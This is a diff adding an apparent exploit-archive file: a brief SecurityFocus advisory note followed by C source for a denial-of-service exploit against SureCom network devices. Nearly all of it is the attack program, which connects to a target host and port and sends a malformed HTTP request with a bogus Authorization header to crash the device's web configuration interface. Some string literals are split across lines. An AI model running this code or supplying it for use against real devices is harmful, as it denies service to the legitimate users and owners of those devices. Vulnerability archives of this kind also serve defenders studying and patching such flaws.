@@ -1,0 +1,71 @@
+source: http://www.securityfocus.com/bid/9795/info
+ 
+An issue in the handling of specific web requests by SureCom network devices has been identified. By placing a malformed request to the web configuration interface, it is possible for an attacker to deny service to legitimate users of a vulnerable device.
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+int main(int argc, char *argv[]) {
+        if(argc < 3) {
+                printf("SureCom Network Device
+DoS,\n");
+                printf("by shaun2k2 -
+shaunige@yahoo.co.uk\n\n");
+                printf("Usage: %s <host> <port>\n",
+argv[0]);
+                exit(-1);
+        }
+
+        int sock;
+        struct hostent *he;
+        struct sockaddr_in dest;
+
+        if((he = gethostbyname(argv[1])) == NULL) {
+                herror("gethostbyname()");
+                exit(-1);
+        }
+
+
+        printf("SureCom Network Device DoS,\n");
+        printf("by shaun2k2 -
+shaunige@yahoo.co.uk\n\n");
+
+        printf("[+] Crafting exploit buffer...\n\n");
+        char explbuf[] = "GET /
+HTTP/1.1\r\nAuthorization: B 00000000\r\n\r\n";
+
+        if((sock = socket(AF_INET, SOCK_STREAM, 0)) <
+0) {
+                perror("socket()");
+                exit(-1);
+        }
+
+        dest.sin_family = AF_INET;
+        dest.sin_port = htons(atoi(argv[2]));
+        dest.sin_addr = *((struct in_addr
+*)he->h_addr);
+
+        printf("[+] Connecting...\n");
+        if(connect(sock, (struct sockaddr *)&dest,
+sizeof(struct sockaddr)) < 0) {
+                perror("socket()");
+                exit(-1);
+        }
+
+        printf("[+] Connected!\n\n");
+
+        printf("[+] Sending malicious HTTP
+request...\n");
+        send(sock, explbuf, strlen(explbuf), 0);
+        sleep(2);
+        close(sock);
+
+        printf("[+] Done!\n");
+
+        return(0);
+}
